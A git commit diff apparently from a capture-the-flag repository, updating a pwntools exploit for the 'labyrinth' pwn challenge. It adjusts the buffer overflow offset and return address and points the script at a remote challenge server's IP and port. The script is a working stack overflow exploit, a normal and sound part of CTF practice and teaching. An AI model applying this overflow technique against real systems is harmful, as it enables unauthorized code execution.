e994f7c04110403c3e02d6df41361d49f53c109c
ShundaZhang <zhangshunda@gmail.com>
2023-03-19 16:33:16 +0800

    Solved labyrinth!

--- CyberApocalypse2023/pwn/pwn_labyrinth/challenge/dec.py
+++ CyberApocalypse2023/pwn/pwn_labyrinth/challenge/dec.py
@@ -3,14 +3,16 @@ from pwn import *
 context.arch = 'amd64'
 context.log_level = 'debug'
 
-offset = 48
-rbp = p64(0x7fffffffe1d0)
-addr = p64(0x401259)
-payload = offset*'A'+rbp+addr
+offset = 56
+#rbp = p64(0x7fffffffe1d0)
+#rbp = p64(0x7ffff7d91010)
+addr = p64(0x401256)
+payload = offset*'A'+addr
 
-#ip,port = '64.227.41.83',30847
-#io = remote(ip,port)
-io = process('./labyrinth')
+ip,port = '64.227.41.83',30847
+io = remote(ip,port)
+#io = process('./labyrinth')
+#io = gdb.debug('./labyrinth', 'break escape_plan')
 
 io.recvuntil('>>')
 io.sendline('69')
